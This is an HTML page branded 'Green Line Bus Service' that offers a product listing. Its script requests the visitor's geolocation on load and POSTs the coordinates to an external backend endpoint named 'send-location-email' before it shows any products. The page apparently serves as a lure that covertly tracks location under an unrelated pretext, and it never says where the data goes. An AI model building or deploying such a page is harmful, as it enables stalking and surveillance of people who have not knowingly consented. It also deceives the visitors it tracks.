<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Location Tracker with Products</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background: #f9f9f9;
            color: #333;
        }

        header {
            background: #4CAF50;
            color: #fff;
            padding: 20px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }

        #location-section, #products-section {
            max-width: 1200px;
            margin: 40px auto;
            padding: 20px;
            background: #fff;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        #status {
            font-size: 18px;
            color: #666;
        }

        .hidden {
            display: none;
        }

        h2 {
            margin-bottom: 10px;
            color: #333;
        }

        .products {
            margin-top: 20px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 20px;
        }

        .product {
            background: #f5f5f5;
            border-radius: 8px;
            text-align: center;
            padding: 15px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
        }

            .product:hover {
                transform: translateY(-5px);
            }

            .product img {
                max-width: 100%;
                height: 120px;
                object-fit: cover;
                border-radius: 5px;
            }

            .product h3 {
                font-size: 18px;
                margin: 10px 0 5px;
            }

            .product p {
                font-size: 16px;
                font-weight: bold;
                color: #4CAF50;
            }

        .btn {
            display: inline-block;
            padding: 10px 20px;
            background: #4CAF50;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background 0.3s ease;
        }

            .btn:hover {
                background: #45a049;
            }

        .alert {
            padding: 15px;
            margin-top: 20px;
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            border-radius: 5px;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <header>
        Green Line Bus Service
    </header>

    <div id="location-section">
        <h2>Getting Your Location...</h2>
        <p id="status">Please allow location access.</p>
    </div>

    <div id="products-section" class="hidden">
        <h2>Product Listing</h2>
        <div class="alert">Thanks for sharing your location!</div>
        <div class="products" id="product-list"></div>
    </div>

    <script>
        const backendUrl = "https://location-tracker-backend-wvgn.onrender.com/send-location-email";
        const products = [
            { name: "Smart Watch", price: "₹2,999", image: "https://via.placeholder.com/150?text=Smart+Watch" },
            { name: "Wireless Earbuds", price: "₹1,499", image: "https://via.placeholder.com/150?text=Earbuds" },
            { name: "Gaming Mouse", price: "₹799", image: "https://via.placeholder.com/150?text=Mouse" },
            { name: "Bluetooth Speaker", price: "₹1,999", image: "https://via.placeholder.com/150?text=Speaker" },
            { name: "Laptop Bag", price: "₹999", image: "https://via.placeholder.com/150?text=Bag" }
        ];

        function renderProducts() {
            const productList = document.getElementById('product-list');
            products.forEach(p => {
                const div = document.createElement('div');
                div.className = 'product';
                div.innerHTML = `<img src="${p.image}" alt="${p.name}"><h3>${p.name}</h3><p>${p.price}</p>`;
                productList.appendChild(div);
            });
        }

        async function sendLocation(latitude, longitude) {
            try {
                await fetch(backendUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ latitude, longitude })
                });
                document.getElementById('location-section').classList.add('hidden');
                document.getElementById('products-section').classList.remove('hidden');
                renderProducts();
            } catch (error) {
                document.getElementById('status').innerText = "Failed to send location.";
            }
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    const { latitude, longitude } = position.coords;
                    document.getElementById('status').innerText = `Location: ${latitude}, ${longitude}`;
                    sendLocation(latitude, longitude);
                },
                error => {
                    document.getElementById('status').innerText = "Location access denied.";
                }
            );
        } else {
            document.getElementById('status').innerText = "Geolocation not supported.";
        }
    </script>

</body>
</html>
